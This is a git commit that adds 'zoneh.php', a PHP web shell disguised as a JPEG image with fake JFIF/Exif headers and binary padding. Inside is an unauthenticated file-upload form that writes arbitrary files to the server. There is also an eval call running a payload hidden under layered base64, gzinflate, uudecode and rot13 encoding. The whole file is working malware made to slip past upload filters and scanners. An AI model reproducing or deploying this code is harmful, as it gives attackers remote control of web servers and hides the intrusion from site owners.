06edb9c5928aa159065b4ec3dcb2422e689d1524
paknago21 <113289817+paknago21@users.noreply.github.com>
2023-09-18 04:03:27 +0700

    Create zoneh.php

---
+++ zoneh.php
@@ -0,0 +1,117 @@
+����JFIF��x�x������Exif��MM�*����
+����E���J����������������(������������������<!--------------------------------------------
+blank*
+--------------------------------------------->����JFIF��x�x������Exif��MM�*����
+����E���J����������������(������������������
+<!--------------------------------------------
+blank*
+--------------------------------------------->
+/*
+/**************************************************************************************/
+*blank*
+/**************************************************************************************/
+*/
+<!--------------------------------------------
+blank*
+--------------------------------------------->����JFIF��x�x������Exif��MM�*����
+����E���J����������������(������������������<!DOCTYPE html>
+<html>
+<head>
+  <title>Upload your files</title>
+</head>
+<body>
+  <form enctype="multipart/form-data" action="" method="POST">
+    <p>Upload your file</p>
+    <input type="file" name="uploaded_file"></input><br />
+    <input type="submit" value="Upload"></input>
+  </form>
+</body>
+</html>
+<?PHP
+  if(!empty($_FILES['uploaded_file']))
+  {
+    $path = "";
+    $path = $path . basename( $_FILES['uploaded_file']['name']);
+
+    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
+      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
+      " has been uploaded";
+    } else{
+        echo "There was an error uploading the file, please try again!";
+    }
+  }
+?>�����x������x������C�
+
+
+
+
+���C		
+
+����<�d"��������������	
+�������}�!1AQa"q2���#B��R��$3br�	
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
+������w�!1AQaq"2�B����	#3R�br�
+$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��<!--------------------------------------------
+blank*
+--------------------------------------------->�����x������x������C�
+
+
+
+
+���C		
+
+����<�d"��������������	
+�������}�!1AQa"q2���#B��R��$3br�	
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
+������w�!1AQaq"2�B����	#3R�br�
+$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��
+
+
+<!--------------------------------------------
+blank*
+--------------------------------------------->����JFIF��x�x������Exif��MM�*����
+����E���J����������������(����������������������JFIF��x�x������Exif��MM�*����
+����E���J����������������(������������������
+<!--------------------------------------------
+blank*
+--------------------------------------------->����JFIF��x�x������Exif��MM�*����
+����E���J����������������(������������������
+<!--------------------------------------------
+blank*
+--------------------------------------------->
+/*
+/**************************************************************************************/
+*blank*
+/**************************************************************************************/
+*/
+<!--------------------------------------------
+blank*
+--------------------------------------------->
+����JFIF��x�x������Exif��MM�*����
+����E���J����������������(������������������<?php eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode('FZdVtqtQEET/7ywIwTXB3Z2Du2b+o3i8AbCAruqq3WAVAa3nhILcI3vLNOQtH5Gn377UfqVNHbxA7bbJxbxxvvaXL42qvTNVfjsbEIs/8BKZNEvmaRI9VcxGj8WgRd4JBUCDMr394/saO/oYEvGLJsZr2MgxkJmi9Wyg138AGdQxGzHrrQQkdfhivXtfpxbkIfZtaTVXi5qEGCuDVt0o88RV++d8cLgV3XAs/4AnApGJUxaKh3U9OpCrHu/MrP1LxRtSietFCUAnUbqMJIMw66FKj+GOpL4adPcPBFoRCdYp0jsD+Gip33JsRtPSt/Nq3/J4zjMaXDKsONnBwry0cFLNRGnUkngo/oH3SJLRWYxvSMAm4s4qzYoIu42WZ44xX9vE19N3SLJ+/nszxjlil6onFz+p5N/wBwyflotycNywieNUlgx8u15HhksF9KJZjFSnF/srx9mhZxLvZDodWtuAqiqAP8sfQF9RjbqLvBqN5lSWeET38T2BgCVKPomahEGG/DaiSeWclOUNHwT+t2M6DL+sR7E+7tkggQsbopwbBZtj7bYjZaD2NVV4BlZPVU9xW1rBVgcbx+jYJpn1eCkKS/oHvsprrliqXpr6k9NX8fGD0ETJvu4W0+ACu1AMx8AlcFRzscHThzGP6dghuD+x8A/oR4UlP+N1fsj46t2vrlrStO9uLHj0rkA5Zdx80n8GUaAr92vI04umIIr5wBrxKGZeiogkVd0huBtQ/rrbw4vtz8t2tLAYYuc6+3n2+qkxYarZPr5IXW/IadXrxat/IEYaV51/OrxG72lqBYYT9cmia7tFoX5houmOiwK7Y/+icHbAe1eVAttsXQumoj/QDP1xWXusx8sHU4lEmbxQmnp/KlVHzSEHTyqx/phxHSRSAmZj3PcoT/upTuD4D9SGCJCQhlUyyzDLlb2Kdd/0ba/RYyvXlln75SUBECCppuuR0sZCsYi+RB7l7D8wjdNlneYEr2iPEizxxUYtqDHTl+WZhQbfszVEYvvQo7KhTn7jviTvxefJ+3LkP3Cd553O45JeVVK4O7nb5845W9zWB1iHhp6DNIiS+g7MROz6OewoSZwpe5QS7HGq3yt5bZzVLcANY3396Gan+w5okZ3437HNrcPstJG+W8NIpl7E7hMxGRKNs2I5/wAJTrTWDsqRsT5a7hCb1OvAkjO4rpL/7hEvRgMmJMRlwFrbGGAehu3iSePn3M2zoU4HAmUBTn6OO0zBiV2nBuMI3Su24bk3Vq4nlBBo62tjowBklUyI1yx3xX5df8C+eP/GptCg7kggrWyftzubnTE1XeZI9gaBYxieTzi8ek8elgNy6Y4oWMyJ9yeZnJDJ64+T4F+v40LpRTlWXSyXhn7QyA+/BRkrdMpKRu3+nLVcmSaJAw5Fo/BL3n9gwOatklVqfFf4FkNuYswEzkdjr5XYDN/eJtv1S57DePeW3DjsW8l6Sl0O53UQfyBHzjWi+LpmTfvq0HupL9pkK9t4AlXuD69uUY2z+32EGcHo+W+9eit268d4uc9/43uxEYCULq/3a5l8xCOkkaeOYbwopYx/s8EpO3QHNsucJccGXHUjG6GL5CH3z8zlRrfGssXeJXGU9HpbyZhpxj4iBdwBT7pp1p48xn/1TtXM0REjMPkLEIUasfy/17gAmM7y3TtOV5YuuquDzcnRHWk1SEYdwX915paXfQ0ZiBiofh/1XRjYdx6p/++ez5u9r5I9xz5H9PQ3f5hLtVmqUPIbtcQ32rpwgrga8LTwjRA53p8pKx+V9+zYRW6wvAyWeSxs9W3gPCiH0iR3XrWKOPPKX2LZCtoGDPtkXk+dLexQ51AYLbiNP8ALowv10W7Ui3Jo0ngbM3+u0xRa+MQM0hfhRJ7l8IhCCllZXEXBcdP91vyyA+kPdN0tnmddmv2GOs7pcWCPpdYuyAEMLKg9i6m5IBYWkjJcf2+5Iqb2jqoTxyi2Z0v4GpKkeeM6LXPcwtPzb8sW6HjBk1cV5B0liiWrT59ClaleCQfv+pyFsfeDz2dqVL7tb6pXr0sn+k0QyTO7r5+uotri46at4aaW57PZmhxNTPAYcIWr6FdyXLq3/4GEcdh8qlqj5qI1uQ9CtV4XvtzAPodZni+aqu2Pu9x1ySmCVaxMdHi8uoayajt/QMJHAbxDiv51UkNtcrJ3m7e9tfJFhYWMSKYdQI+vcJ7CoIMYpeyQf6uuPD5CH7fEn3U8j9I2Zla9yRxJ5sCdM+i33d/QvrY+L+csIDpvEhiX5WolYVaQvCDyZ87eH1i3nrf7ngWytw84AlSyGolLSM7Bya1cE5+Cm6yxAEvaJndyK2b2QQ+7Tbng9XQofHx+T1sMavVCxd99l348F2j3Ou6BXQ+iyJeQWdUtwmNZ5aOP3xy7JmWehEzRsyU3LfDbOg7qvV523HdBclSpkL7XwaC/C2vz7r0gdbaJ2tFS0VR1su+F2NX1u/8o9piKQM1dMKRcHMd7TnoeNcyDL1hZWNdg598VQRC2Is870heaqr58c1Gbw8b46XHLJ56JzK9tb5evaFLaFCQfBjMX5cEAAtqnwAR1CwXFNPkWJoiuKX6JwKfsh1Qe4koi23LHT5gnPNQKxVeZ9mgWxxSQVn/bDaQ0zPvmFwApB+l4/Hej7hI5sZy28T/A+SWHoGqCTZ2nUfgyIbG79k++fwn0f4Jz3pFRdZYTpvewzro2rr4mO7q7jl79AZfYd/ZcQg4H6oaa8xV5dWndu9XsNuw7u41XvVP3fmfIn6HNr9+nskZw0Mo5ff9AiU6DIHPSLDimDhHHW+qMPmyqydrsXmMuKifUeHfyJnF0o1nN3Lqbbz1I1l6S/31euWNxBF1ayqOKH322f50ceT559paX8k2Aa7M05HJ2g48AyuHXVh5G01zUf7fcqc59xx+rlgtxTItRd8mGPLK9GUlqGqr/ENjK7z/9oLax17MivZRfGY53QdbP002rlf3TMxjZpbsrQeOXW/L7Z9Xq22GHuD+pAq54w1yWfBuYidl1nGEtWl1L8SGuoP3qXYvVUxooWLSbruhiA3LhAX9JH1bhMlSib9Yei0mrrrQMJ74G9wzsr1qsTwv2pcSsGqDg2QOyI6MK/apeNfuaGBmOeuAbODxWfKD3TSKtzTIFL43syV11y8ctdMLgcDpW+1uY13y6lcV+yn00LAorKPS06O7+jS9EohMbPjKy4rcJntF1Q1z3+M9rVCN99qlyLAqhB4mUtWIqzz791bNSYhd6qf2oN9uFDs74Vh4AXnjfxTaMKx5OfTfMau7q9OEucop+jmF8bhsz4e/WtMyVziuZn1DPoMqKfEbqwpBZu8sVCEGyJn8Aetpl7caz8GmnY542qwXEy+wZzq8iSmzA7PGqJJmI9mw/FlB8OxFo41Wks/Ahro3tfA3X4RdreoJ2L410I1ZtJRjPjUPpuN3cem0T7/FYny1kHB4agSchT0uInruE6y7XsQwftQp3IURt/KwDXwQxglRlEscGfvMU0rRtUBfJq0Y/smLUCmEZp5g8TZTrT9FfIJEH7b8leh6xynfrr/e4m7QhqGqbjHJ3ZtqmOySkK/GssRd/J3XPPO3Pg8w098yvbswI2NzdYLtpy/e0RWHFtEPBpjmrJ4w0ACSapR4+qzU9FT/7WtAztUk/SzndZzblOM2wPM3laWwARwyXVpvQ8a7k+WVvhyDs+e5ygoIOvUNsTz78vw2GtfrAyzw/0MsnqVPFUS3aP44cIspRQ6p42Qy7sWNVI+1OWIql7IuCl9+GzMyHeprJn6kGTVTXiaksh5pOMxd+DIrMM3OFXp1ju7a3nqS1A+GX2DFbI1mkZzjhNv6BXy30B2S9gzXABgqCwK/8svJ1cMNC/25Ofk5DePRQPQEiXG/2dXqpsL4izdvOx+fheVcpQpwDsW70z2xM3Al+1GCTNqZwb+bJ1T53wzecvYvp2HYkuireioWQIU7/DyzjXipG+5pHPkosOYVNhgAT7gcmtscYjBv+RBgfhI1PZteyBJ1OZT2uLX2Q/iHsk5NRojlL4aPI2A3bZqr0FEaja4nkl06qnzM8o/job46DbEG5jnL3uDriaPTl/BlnEBTUoVKU4dT3dOg/ObyslzxMSS7rTkrPd8P9/f7+AQ==')))))));
+�����x������x������C�
+
+
+
+
+���C		
+
+����<�d"��������������	
+�������}�!1AQa"q2���#B��R��$3br�	
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
+������w�!1AQaq"2�B����	#3R�br�
+$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��
+<!--------------------------------------------
+blank*
+--------------------------------------------->�����x������x������C�
+
+
+
+
+���C		
+
+����<�d"��������������	
+�������}�!1AQa"q2���#B��R��$3br�	
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
+������w�!1AQaq"2�B����	#3R�br�
+$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��
